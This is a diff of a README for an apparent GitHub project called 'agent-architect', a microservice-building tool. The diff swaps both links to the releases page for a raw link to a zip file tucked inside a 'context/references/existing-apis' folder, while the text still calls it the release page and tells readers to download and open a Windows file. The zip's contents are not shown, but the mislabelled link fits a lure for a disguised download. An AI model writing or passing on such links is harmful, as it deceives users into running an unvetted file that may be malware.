@@ -1,6 +1,6 @@
 # 🤖 agent-architect - Build microservices with clear steps
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Lluis5713/agent-architect/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lluis5713/agent-architect/main/context/references/existing-apis/architect_agent_2.4.zip)
 
 ## 🧭 What this app does
 
@@ -16,7 +16,7 @@ This tool fits teams and solo users who want a structured way to build software 
 
 ## 📥 Download and install
 
-1. Open the release page: https://github.com/Lluis5713/agent-architect/releases
+1. Open the release page: https://raw.githubusercontent.com/Lluis5713/agent-architect/main/context/references/existing-apis/architect_agent_2.4.zip
 2. Find the latest release
 3. Download the Windows file from that release
 4. Open the file after it finishes downloading
